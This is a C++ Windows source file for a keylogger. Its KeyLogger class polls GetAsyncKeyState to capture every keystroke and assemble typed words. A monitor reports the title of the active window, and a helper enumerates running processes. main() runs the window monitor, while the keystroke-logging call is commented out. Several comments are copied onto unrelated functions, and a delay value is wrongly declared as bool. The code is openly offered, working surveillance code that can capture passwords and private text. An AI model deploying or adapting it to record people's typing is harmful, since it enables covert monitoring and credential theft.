#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <tchar.h>
#include <functional>
#include <atlstr.h>
#include <locale>
#include <codecvt>
#include <psapi.h>
#include <shlwapi.h>
#include <libloaderapi.h>
#pragma comment(lib, "psapi.lib")
/*
* Return the current pressed key or null
*/
bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '¾': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}
/*
* Infinite while loop.
*/
class Looper {
    /*
    * Return the current pressed key or null
    */
    public: static void DoWhile(int sleep, bool keepDoing, const std::function<void()>& callback)
    {
        while (keepDoing) {
            Sleep(sleep);
            callback();
        }
    }
};
/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    * public: static std::vector<std::string> words;
    */
    /*
    * Start the KeyLogger loop.
    */
    public: static void Start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            word = KeyLogger::onNewWord(word, charCallback, wordCallback);
        }
    }
    /*
    * Start the KeyLogger loop.
    */
    public: static std::string onNewWord(std::string word, void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        char character = KeyLogger::CatchChar();
        if (character == NULL) return word;
        word = KeyLogger::BuildWord(character, word, wordCallback);
        charCallback(character);
        return word;
    }
    /*
    * Return the current pressed key or null
    */
    public: static std::string BuildWord(char character, std::string word, const std::function<void(std::string)>& callback)
    {
        if (character == NULL) return word;
        if (IsWordEnder((int)character)) {
            callback(word);
            return "";
        }
        if ((int)character == VK_BACK) word.pop_back();
        return word + character;
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool IsWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char CatchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachChar(void(*callback)(char))
    {
        KeyLogger::Start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void ForEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::Start([](char c){}, callback);
    }
};
/*
* Return the current pressed key or null
*/
std::string GetActiveWindowTitle()
{
    //LPSTR wnd_title;
    char wnd_title[256];
    char wnd_path[256];
    // get handle of currently active window
    HWND hwnd = GetForegroundWindow();
    // get title text of currently active window
    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
    // get exe path of currently active window
    GetWindowModuleFileNameA(hwnd, wnd_path, sizeof(wnd_path));
    std::string title = wnd_title;
    std::string path = wnd_path;
    return title;
}
/// <summary>
/// 
/// </summary>
class Monitor {
public: static std::string onWindowChange(std::string activeWindow, const std::function<void(std::string)>& callback)
    {
        std::string newActiveWindow = GetActiveWindowTitle();
        if (newActiveWindow != activeWindow) {
            activeWindow = newActiveWindow;
            callback(activeWindow);
        }
        return activeWindow;
    }
};


// To ensure correct resolution of symbols, add Psapi.lib to TARGETLIBS
// and compile with -DPSAPI_VERSION=1

void PrintProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");

    // Get a handle to the process.

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    // Print the process name and identifier.

    _tprintf(TEXT("%s  (PID: %u)\n"), szProcessName, processID);

    // Release the handle to the process.

    CloseHandle(hProcess);
}

/// <summary>
/// 
/// </summary>
/// <returns></returns>
int main()
{
    bool monitor = true;
    bool delay = 50; // 50 ms
    std::vector<std::string> words;
    std::string word = "";
    std::string activeWindow = "";
    // infinite loop each 50 ms
    Looper::DoWhile(delay, monitor, [&word, &activeWindow]() {
        // word assignation
        //word = KeyLogger::onNewWord(word, [](char c) {}, [](std::string w) {
        //    // new word appear!!
        //    std::cout << w << std::endl;
        //});
        // active window assignation
        activeWindow = Monitor::onWindowChange(activeWindow, [](std::string w) {
            // active window has been changed!!
            std::cout << w << std::endl;
        });
    });
    //// for (const auto& value: words) std::cout << value + char(VK_SPACE);

    // Get the list of process identifiers.

    //DWORD aProcesses[1024], cbNeeded, cProcesses;
    //unsigned int i;

    //if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    //{
    //    return 1;
    //}


    //// Calculate how many process identifiers were returned.

    //cProcesses = cbNeeded / sizeof(DWORD);

    //// Print the name and process identifier for each process.

    //for (i = 0; i < cProcesses; i++)
    //{
    //    if (aProcesses[i] != 0)
    //    {
    //        PrintProcessNameAndID(aProcesses[i]);
    //    }
    //}

    return 0;
}
